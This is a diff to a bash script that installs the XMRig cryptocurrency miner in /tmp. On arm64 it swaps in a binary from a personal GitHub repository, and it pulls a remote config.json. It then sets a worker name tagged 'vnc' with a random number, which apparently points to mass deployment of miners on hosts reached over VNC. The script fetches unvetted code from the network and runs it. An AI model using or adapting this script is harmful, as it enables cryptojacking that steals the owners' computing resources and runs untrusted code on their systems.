@@ -1,5 +1,7 @@
 #!/bin/bash
 
+xmrver="6.21.3"
+
 if [ -d /tmp ]; then
     echo "/tmp exists"
 else
@@ -28,21 +30,25 @@ if [ "$arch" == "aarch64" ]; then
     is_arm64=true
 fi
 
+mkdir -p /tmp/xmrig
+# run the script in /tmp/xmrig, after the script checks if it exists or not
+cd /tmp/xmrig
+
 # use curl because it's present on more distributions
-$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
-tar -xf xmrig-6.21.3-linux-static-x64.tar.gz
-cd xmrig-6.21.3
+$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
+tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
+cd xmrig-$xmrver
 
 # replace xmrig file if system is arm64
 if $is_arm64; then
-    rm -rf xmrig
+    rm -f xmrig
     $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
 fi
 
 # just to be extra safe
 chmod +x xmrig
 
-rm -rf config.json
+rm -f config.json
 $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
